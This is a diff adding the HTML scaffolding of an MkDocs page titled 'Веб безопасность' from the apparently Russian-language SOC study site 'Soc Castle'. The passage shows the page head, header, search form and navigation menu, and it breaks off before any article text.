@@ -1,0 +1,1590 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://soc.castle/sobes/web_sec/">
+      
+      
+        <link rel="prev" href="../analyse_siem/">
+      
+      
+        <link rel="next" href="../obshie/">
+      
+      
+      <link rel="icon" href="../../assets/favicon.ico">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.9">
+    
+    
+      
+        <title>Веб безопасность - Soc Castle</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.4af4bdda.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=JetBrains+Mono:300,300i,400,400i,700,700i%7CRed+Hat+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"JetBrains Mono";--md-code-font:"Red Hat Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#1-http" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Soc Castle" class="md-header__button md-logo" aria-label="Soc Castle" data-md-component="logo">
+      
+  <img src="../../assets/avatar_rect.jpg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Soc Castle
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Веб безопасность
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="deep-purple"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: ligh)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+    
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M0 1.75A.75.75 0 0 1 .75 1h4.253c1.227 0 2.317.59 3 1.501A3.74 3.74 0 0 1 11.006 1h4.245a.75.75 0 0 1 .75.75v10.5a.75.75 0 0 1-.75.75h-4.507a2.25 2.25 0 0 0-1.591.659l-.622.621a.75.75 0 0 1-1.06 0l-.622-.621A2.25 2.25 0 0 0 5.258 13H.75a.75.75 0 0 1-.75-.75Zm7.251 10.324.004-5.073-.002-2.253A2.25 2.25 0 0 0 5.003 2.5H1.5v9h3.757a3.75 3.75 0 0 1 1.994.574M8.755 4.75l-.004 7.322a3.75 3.75 0 0 1 1.992-.572H14.5v-9h-3.495a2.25 2.25 0 0 0-2.25 2.25"/></svg>
+    
+  
+  Главная
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../notes/ss/" class="md-tabs__link">
+          
+  
+    
+  
+  Конспекты
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../analyse_po/" class="md-tabs__link">
+          
+  
+    
+  
+  Вопросы Собесов
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../study_res/res/" class="md-tabs__link">
+        
+  
+    
+  
+  Образовательные ресурсы
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Soc Castle" class="md-nav__button md-logo" aria-label="Soc Castle" data-md-component="logo">
+      
+  <img src="../../assets/avatar_rect.jpg" alt="logo">
+
+    </a>
+    Soc Castle
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path d="M0 1.75A.75.75 0 0 1 .75 1h4.253c1.227 0 2.317.59 3 1.501A3.74 3.74 0 0 1 11.006 1h4.245a.75.75 0 0 1 .75.75v10.5a.75.75 0 0 1-.75.75h-4.507a2.25 2.25 0 0 0-1.591.659l-.622.621a.75.75 0 0 1-1.06 0l-.622-.621A2.25 2.25 0 0 0 5.258 13H.75a.75.75 0 0 1-.75-.75Zm7.251 10.324.004-5.073-.002-2.253A2.25 2.25 0 0 0 5.003 2.5H1.5v9h3.757a3.75 3.75 0 0 1 1.994.574M8.755 4.75l-.004 7.322a3.75 3.75 0 0 1 1.992-.572H14.5v-9h-3.495a2.25 2.25 0 0 0-2.25 2.25"/></svg>
+  
+  <span class="md-ellipsis">
+    Главная
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Конспекты
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Конспекты
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/ss/" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 1h16a1 1 0 0 1 1 1v4a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1m0 8h16a1 1 0 0 1 1 1v.67l-2.5-1.11-6.5 2.88V15H3a1 1 0 0 1-1-1v-4a1 1 0 0 1 1-1m0 8h8c.06 2.25 1 4.4 2.46 6H3a1 1 0 0 1-1-1v-4a1 1 0 0 1 1-1M8 5h1V3H8zm0 8h1v-2H8zm0 8h1v-2H8zM4 3v2h2V3zm0 8v2h2v-2zm0 8v2h2v-2zm13.5-7 4.5 2v3c0 2.78-1.92 5.37-4.5 6-2.58-.63-4.5-3.22-4.5-6v-3zm0 1.94L15 15.06v2.66c0 1.54 1.07 2.98 2.5 3.34z"/></svg>
+  
+  <span class="md-ellipsis">
+    Server Side
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/cs/" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M16.5 15.5c1.72 0 3.75.8 4 1.28v.72h-8v-.72c.25-.48 2.28-1.28 4-1.28m0-1.5c-1.83 0-5.5.92-5.5 2.75V19h11v-2.25c0-1.83-3.67-2.75-5.5-2.75M9 13c-2.33 0-7 1.17-7 3.5V19h7v-1.5H3.5v-1c0-.63 2.79-2.16 6.32-2a5.1 5.1 0 0 1 1.55-1.25A12.3 12.3 0 0 0 9 13m0-6.5A1.5 1.5 0 1 1 7.5 8 1.5 1.5 0 0 1 9 6.5M9 5a3 3 0 1 0 3 3 3 3 0 0 0-3-3m7.5 3.5a1 1 0 1 1-1 1 1 1 0 0 1 1-1m0-1.5A2.5 2.5 0 1 0 19 9.5 2.5 2.5 0 0 0 16.5 7"/></svg>
+  
+  <span class="md-ellipsis">
+    Client Side
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/linux_base/" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12.504 0q-.232 0-.48.021c-4.226.333-3.105 4.807-3.17 6.298-.076 1.092-.3 1.953-1.05 3.02-.885 1.051-2.127 2.75-2.716 4.521-.278.832-.41 1.684-.287 2.489a.4.4 0 0 0-.11.135c-.26.268-.45.6-.663.839-.199.199-.485.267-.797.4-.313.136-.658.269-.864.68-.09.189-.136.394-.132.602 0 .199.027.4.055.536.058.399.116.728.04.97-.249.68-.28 1.145-.106 1.484.174.334.535.47.94.601.81.2 1.91.135 2.774.6.926.466 1.866.67 2.616.47.526-.116.97-.464 1.208-.946.587-.003 1.23-.269 2.26-.334.699-.058 1.574.267 2.577.2.025.134.063.198.114.333l.003.003c.391.778 1.113 1.132 1.884 1.071s1.592-.536 2.257-1.306c.631-.765 1.683-1.084 2.378-1.503.348-.199.629-.469.649-.853.023-.4-.2-.811-.714-1.376v-.097l-.003-.003c-.17-.2-.25-.535-.338-.926-.085-.401-.182-.786-.492-1.046h-.003c-.059-.054-.123-.067-.188-.135a.36.36 0 0 0-.19-.064c.431-1.278.264-2.55-.173-3.694-.533-1.41-1.465-2.638-2.175-3.483-.796-1.005-1.576-1.957-1.56-3.368.026-2.152.236-6.133-3.544-6.139m.529 3.405h.013c.213 0 .396.062.584.198.19.135.33.332.438.533.105.259.158.459.166.724 0-.02.006-.04.006-.06v.105l-.004-.021-.004-.024a1.8 1.8 0 0 1-.15.706.95.95 0 0 1-.213.335 1 1 0 0 0-.088-.042c-.104-.045-.198-.064-.284-.133a1.3 1.3 0 0 0-.22-.066c.05-.06.146-.133.183-.198q.08-.193.088-.402v-.02a1.2 1.2 0 0 0-.061-.4c-.045-.134-.101-.2-.183-.333-.084-.066-.167-.132-.267-.132h-.016c-.093 0-.176.03-.262.132a.8.8 0 0 0-.205.334 1.2 1.2 0 0 0-.09.4v.019q.002.134.02.267c-.193-.067-.438-.135-.607-.202a2 2 0 0 1-.018-.2v-.02a1.8 1.8 0 0 1 .15-.768 1.08 1.08 0 0 1 .43-.533 1 1 0 0 1 .594-.2zm-2.962.059h.036c.142 0 .27.048.399.135.146.129.264.288.344.465.09.199.14.4.153.667v.004c.007.134.006.2-.002.266v.08c-.03.007-.056.018-.083.024-.152.055-.274.135-.393.2q.018-.136.003-.267v-.015c-.012-.133-.04-.2-.082-.333a.6.6 0 0 0-.166-.267.25.25 0 0 0-.183-.064h-.021c-.071.006-.13.04-.186.132a.55.55 0 0 0-.12.27 1 1 0 0 0-.023.33v.015c.012.135.037.2.08.334.046.134.098.2.166.268q.014.014.034.024c-.07.057-.117.07-.176.136a.3.3 0 0 1-.131.068 2.6 2.6 0 0 1-.275-.402 1.8 1.8 0 0 1-.155-.667 1.8 1.8 0 0 1 .08-.668 1.4 1.4 0 0 1 .283-.535c.128-.133.26-.2.418-.2m1.37 1.706c.332 0 .733.065 1.216.399.293.2.523.269 1.052.468h.003c.255.136.405.266.478.399v-.131a.57.57 0 0 1 .016.47c-.123.31-.516.643-1.063.842v.002c-.268.135-.501.333-.775.465-.276.135-.588.292-1.012.267a1.1 1.1 0 0 1-.448-.067 4 4 0 0 1-.322-.198c-.195-.135-.363-.332-.612-.465v-.005h-.005c-.4-.246-.616-.512-.686-.71q-.104-.403.193-.6c.224-.135.38-.271.483-.336.104-.074.143-.102.176-.131h.002v-.003c.169-.202.436-.47.839-.601.139-.036.294-.065.466-.065zm2.8 2.142c.358 1.417 1.196 3.475 1.735 4.473.286.534.855 1.659 1.102 3.024.156-.005.33.018.513.064.646-1.671-.546-3.467-1.089-3.966-.22-.2-.232-.335-.123-.335.59.534 1.365 1.572 1.646 2.757.13.535.16 1.104.021 1.67.067.028.135.06.205.067 1.032.534 1.413.938 1.23 1.537v-.043c-.06-.003-.12 0-.18 0h-.016c.151-.467-.182-.825-1.065-1.224-.915-.4-1.646-.336-1.77.465-.008.043-.013.066-.018.135-.068.023-.139.053-.209.064-.43.268-.662.669-.793 1.187-.13.533-.17 1.156-.205 1.869v.003c-.02.334-.17.838-.319 1.35-1.5 1.072-3.58 1.538-5.348.334a2.7 2.7 0 0 0-.402-.533 1.5 1.5 0 0 0-.275-.333c.182 0 .338-.03.465-.067a.62.62 0 0 0 .314-.334c.108-.267 0-.697-.345-1.163s-.931-.995-1.788-1.521c-.63-.4-.986-.87-1.15-1.396-.165-.534-.143-1.085-.015-1.645.245-1.07.873-2.11 1.274-2.763.107-.065.037.135-.408.974-.396.751-1.14 2.497-.122 3.854a8.1 8.1 0 0 1 .647-2.876c.564-1.278 1.743-3.504 1.836-5.268.048.036.217.135.289.202.218.133.38.333.59.465.21.201.477.335.876.335q.058.005.11.006c.412 0 .73-.134.997-.268.29-.134.52-.334.74-.4h.005c.467-.135.835-.402 1.044-.7zm2.185 8.958c.037.6.343 1.245.882 1.377.588.134 1.434-.333 1.791-.765l.211-.01c.315-.007.577.01.847.268l.003.003c.208.199.305.53.391.876.085.4.154.78.409 1.066.486.527.645.906.636 1.14l.003-.007v.018l-.003-.012c-.015.262-.185.396-.498.595-.63.401-1.746.712-2.457 1.57-.618.737-1.37 1.14-2.036 1.191-.664.053-1.237-.2-1.574-.898l-.005-.003c-.21-.4-.12-1.025.056-1.69.176-.668.428-1.344.463-1.897.037-.714.076-1.335.195-1.814.12-.465.308-.797.641-.984l.045-.022zm-10.814.049h.01q.08 0 .157.014c.376.055.706.333 1.023.752l.91 1.664.003.003c.243.533.754 1.064 1.189 1.637.434.598.77 1.131.729 1.57v.006c-.057.744-.48 1.148-1.125 1.294-.645.135-1.52.002-2.395-.464-.968-.536-2.118-.469-2.857-.602q-.553-.1-.723-.4c-.11-.2-.113-.602.123-1.23v-.004l.002-.003c.117-.334.03-.752-.027-1.118-.055-.401-.083-.71.043-.94.16-.334.396-.4.69-.533.294-.135.64-.202.915-.47h.002v-.002c.256-.268.445-.601.668-.838.19-.201.38-.336.663-.336m7.159-9.074c-.435.201-.945.535-1.488.535-.542 0-.97-.267-1.28-.466-.154-.134-.28-.268-.373-.335-.164-.134-.144-.333-.074-.333.109.016.129.134.199.2.096.066.215.2.36.333.292.2.68.467 1.167.467.485 0 1.053-.267 1.398-.466.195-.135.445-.334.648-.467.156-.136.149-.267.279-.267.128.016.034.134-.147.332a8 8 0 0 1-.69.468zm-1.082-1.583V5.64c-.006-.02.013-.042.029-.05.074-.043.18-.027.26.004.063 0 .16.067.15.135-.006.049-.085.066-.135.066-.055 0-.092-.043-.141-.068-.052-.018-.146-.008-.163-.065m-.551 0c-.02.058-.113.049-.166.066-.047.025-.086.068-.14.068-.05 0-.13-.02-.136-.068-.01-.066.088-.133.15-.133.08-.031.184-.047.259-.005.019.009.036.03.03.05v.02h.003z"/></svg>
+  
+  <span class="md-ellipsis">
+    Linux Base
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/bol/" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m21.85 16.96-9-14.49a1.003 1.003 0 0 0-1.7 0l-9 14.49c-.31.49-.15 1.22.49 1.47l9 3.5c.11.07.24.07.36.07s.25 0 .36-.07l9-3.5c.64-.25.8-.98.49-1.47M11 6.5v6.82L5.42 15.5zm1 13.43L5.76 17.5 12 15.07l6.24 2.43zm1-6.61V6.5l5.58 9z"/></svg>
+  
+  <span class="md-ellipsis">
+    Пирамида боли
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/ad_ldap_kerberos/" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M0 96c0-35.3 28.7-64 64-64h132.1c19.1 0 37.4 7.6 50.9 21.1L289.9 96H448c35.3 0 64 28.7 64 64v256c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64zm64-16c-8.8 0-16 7.2-16 16v320c0 8.8 7.2 16 16 16h384c8.8 0 16-7.2 16-16V160c0-8.8-7.2-16-16-16H286.6c-10.6 0-20.8-4.2-28.3-11.7L213.1 87c-4.5-4.5-10.6-7-17-7z"/></svg>
+  
+  <span class="md-ellipsis">
+    AD, LDAP, KERBEROS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/mitreattack/" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M.632.55v22.9H2.28V24H0V0h2.28v.55zm7.043 7.26v1.157h.033a3.3 3.3 0 0 1 1.117-1.024c.433-.245.936-.365 1.5-.365q.81.002 1.481.314c.448.208.785.582 1.02 1.108q.382-.562 1.034-.992.651-.43 1.546-.43.679 0 1.26.167c.388.11.716.286.993.53.276.245.489.559.646.951q.229.587.23 1.417v5.728h-2.349V11.52q0-.43-.032-.812a1.8 1.8 0 0 0-.18-.66 1.1 1.1 0 0 0-.438-.448q-.292-.165-.785-.166-.498 0-.803.189a1.4 1.4 0 0 0-.48.499 2 2 0 0 0-.231.696 5.6 5.6 0 0 0-.06.785v4.768h-2.35v-4.8q.002-.38-.018-.752a2.1 2.1 0 0 0-.143-.688 1.05 1.05 0 0 0-.415-.503c-.194-.125-.476-.19-.854-.19q-.168 0-.439.074c-.18.051-.36.143-.53.282a1.64 1.64 0 0 0-.439.595q-.18.39-.18 1.02v4.966H5.46V7.81zm15.693 15.64V.55H21.72V0H24v24h-2.28v-.55z"/></svg>
+  
+  <span class="md-ellipsis">
+    MITRE ATT&CK
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../notes/sobes_polety/" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M192 96a48 48 0 1 0 0-96 48 48 0 1 0 0 96m-8 384V352h16v128c0 17.7 14.3 32 32 32s32-14.3 32-32V192h136c17.7 0 32-14.3 32-32s-14.3-32-32-32h-16V64h192v192H384v-32h-64v48c0 26.5 21.5 48 48 48h224c26.5 0 48-21.5 48-48V48c0-26.5-21.5-48-48-48H368c-26.5 0-48 21.5-48 48v80H177.2c-33.7 0-64.9 17.7-82.3 46.6l-58.3 97c-9.1 15.1-4.2 34.8 10.9 43.9s34.8 4.2 43.9-10.9l28.6-47.7V480c0 17.7 14.3 32 32 32s32-14.3 32-32"/></svg>
+  
+  <span class="md-ellipsis">
+    Разбор полетов с собесов
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Вопросы Собесов
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Вопросы Собесов
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../analyse_po/" class="md-nav__link">
+        
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 .5a1.746 1.746 0 0 0-1 3.18v1.4c-.9.13-1.74.42-2.5.86L7.39 4.35c.19-.52.14-1.12-.2-1.6C6.84 2.26 6.3 2 5.75 2c-.35 0-.7.1-1 .32-.79.55-.99 1.64-.43 2.43.34.49.88.75 1.43.75l1.18 1.68c-.43.43-.77.91-1.06 1.44-.2-.08-.41-.12-.62-.12-.45 0-.9.17-1.25.5-.67.7-.67 1.8 0 2.5.29.27.64.42 1 .5 0 .54.07 1.06.18 1.56l-1.31.35c-.31-.26-.71-.41-1.12-.41-.15 0-.31 0-.46.06a1.75 1.75 0 0 0-1.23 2.15C1.27 16.5 2 17 2.75 17c.15 0 .3 0 .46-.06.57-.16 1-.58 1.18-1.1l1.51-.41c.45.79 1.05 1.49 1.75 2.07l-1.1 2c-.55.08-1.05.39-1.34.92a1.749 1.749 0 1 0 3.08 1.66c.28-.52.27-1.12.02-1.61l1.07-1.97c.81.32 1.69.5 2.62.5h.18c-.13.26-.18.56-.18.88.08.92.84 1.62 1.75 1.62h.13c.97-.08 1.69-.92 1.62-1.88-.04-.5-.29-.94-.65-1.23.47-.21.92-.48 1.34-.79l2.34 2.34c-.1.56.06 1.13.47 